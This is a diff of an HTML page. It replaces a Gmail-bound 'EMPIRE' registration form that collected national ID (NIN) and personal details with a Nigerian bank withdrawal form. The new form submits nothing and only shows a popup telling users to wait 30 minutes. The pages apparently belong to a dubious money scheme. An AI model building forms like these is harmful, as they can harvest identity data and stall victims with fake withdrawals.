@@ -3,124 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registration Request Form</title>
+    <title>Withdrawal Request Form</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f8f8f8;
+            background-color: #f4f4f4;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
         }
         .form-container {
             background-color: #fff;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 600px;
-            width: 100%;
         }
         .form-container h2 {
             margin-bottom: 20px;
             text-align: center;
         }
         .form-group {
-            display: flex;
-            align-items: center;
             margin-bottom: 15px;
         }
         .form-group label {
-            width: 30%;
-            margin-right: 10px;
-            text-align: right;
+            display: block;
+            margin-bottom: 5px;
         }
         .form-group input,
-        .form-group textarea,
         .form-group select {
-            width: 70%;
+            width: 100%;
             padding: 10px;
-            border: 1px solid #ddd;
+            border: 1px solid #ccc;
             border-radius: 4px;
         }
-        .form-group textarea {
-            resize: vertical;
-        }
         .form-group button {
-            padding: 10px 15px;
-            background-color: #007BFF;
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
             color: #fff;
             border: none;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 16px;
-            margin-left: auto;
         }
         .form-group button:hover {
-            background-color: #0056b3;
-        }
-        .declaration-note {
-            font-size: 0.9em;
-            color: #555;
+            background-color: #218838;
         }
     </style>
     <script>
-        function showAlert() {
-            alert("Submit your form to the provided email address. Kindly check your balance after 48 hours. Thank you for choosing EMPIRE.");
+        function showPopup() {
+            alert("This will take up to 30 minutes or more for your request to be submitted successfully. Please wait and do not close your browser.");
         }
     </script>
 </head>
 <body>
     <div class="form-container">
-        <h2>Registration Request Form</h2>
-        <form action="mailto:empirevirtual99@gmail.com" method="post" onsubmit="showAlert()">
+        <h2>Withdrawal Request Form</h2>
+        <form onsubmit="showPopup()">
             <div class="form-group">
-                <label for="first_name">First Name:</label>
-                <input type="text" id="first_name" name="first_name" required>
+                <label for="accountNumber">Account Number</label>
+                <input type="text" id="accountNumber" name="accountNumber" required>
             </div>
             <div class="form-group">
-                <label for="last_name">Last Name:</label>
-                <input type="text" id="last_name" name="last_name" required>
-            </div>
-            <div class="form-group">
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            <div class="form-group">
-                <label for="phone">Phone Number:</label>
-                <input type="tel" id="phone" name="phone" required>
-            </div>
-            <div class="form-group">
-                <label for="dob">Date of Birth:</label>
-                <input type="date" id="dob" name="dob" required>
-            </div>
-            <div class="form-group">
-                <label for="gender">Gender:</label>
-                <select id="gender" name="gender" required>
-                    <option value="male">Male</option>
-                    <option value="female">Female</option>
-                    <option value="other">Other</option>
+                <label for="bankName">Bank Name</label>
+                <select id="bankName" name="bankName" required>
+                    <option value="">Select Bank</option>
+                    <option value="access_bank">Access Bank</option>
+                    <option value="citibank">Citibank</option>
+                    <option value="diamond_bank">Diamond Bank</option>
+                    <option value="ecobank">Ecobank</option>
+                    <option value="fidelity_bank">Fidelity Bank</option>
+                    <option value="first_bank">First Bank</option>
+                    <option value="fcmb">First City Monument Bank (FCMB)</option>
+                    <option value="gtb">Guaranty Trust Bank (GTB)</option>
+                    <option value="heritage_bank">Heritage Bank</option>
+                    <option value="keystone_bank">Keystone Bank</option>
+                    <option value="polaris_bank">Polaris Bank</option>
+                    <option value="providus_bank">Providus Bank</option>
+                    <option value="stanbic_ibtc">Stanbic IBTC Bank</option>
+                    <option value="standard_chartered">Standard Chartered Bank</option>
+                    <option value="sterling_bank">Sterling Bank</option>
+                    <option value="suntrust_bank">Suntrust Bank</option>
+                    <option value="union_bank">Union Bank</option>
+                    <option value="uba">United Bank for Africa (UBA)</option>
+                    <option value="unity_bank">Unity Bank</option>
+                    <option value="wema_bank">Wema Bank</option>
+                    <option value="zenith_bank">Zenith Bank</option>
+                    <option value="opay">OPAY</option>
+                    <option value="palmpay">Palmpay</option>
                 </select>
             </div>
             <div class="form-group">
-                <label for="country">Country:</label>
-                <input type="text" id="country" name="country" value="Nigeria" readonly>
+                <label for="accountName">Account Name</label>
+                <input type="text" id="accountName" name="accountName" required>
             </div>
             <div class="form-group">
-                <label for="nin">NiN:</label>
-                <input type="text" id="nin" name="nin" required>
+                <label for="amount">Amount</label>
+                <input type="number" id="amount" name="amount" required>
             </div>
             <div class="form-group">
-                <label for="referral_id">Referral ID:</label>
-                <input type="text" id="referral_id" name="referral_id">
+                <label for="beneficiaryPhone">Beneficiary's Phone Number</label>
+                <input type="tel" id="beneficiaryPhone" name="beneficiaryPhone" required>
             </div>
             <div class="form-group">
-                <label for="date">Date:</label>
-                <input type="date" id="date" name="date" required>
-            </div>
-            <p class="declaration-note">
-                I hereby declare that the information provided is true and correct to the best of my knowledge and belief. I understand that any false information provided may result in my disqualification from the registration process.
-            </p>
-            <div class="form-group">
-                <button type="submit">Submit</button>
+                <button type="submit">Submit Request</button>
         </form>
+        <p style="margin-top: 20px; font-size: 14px; color: #555;">
+            <strong>Declaration:</strong> I, Sambo7785, hereby declare that the information provided above is accurate and true to the best of my knowledge. Providing incorrect or false information may delay the processing of the withdrawal request or lead to its rejection. It is my responsibility to ensure all details are correct.
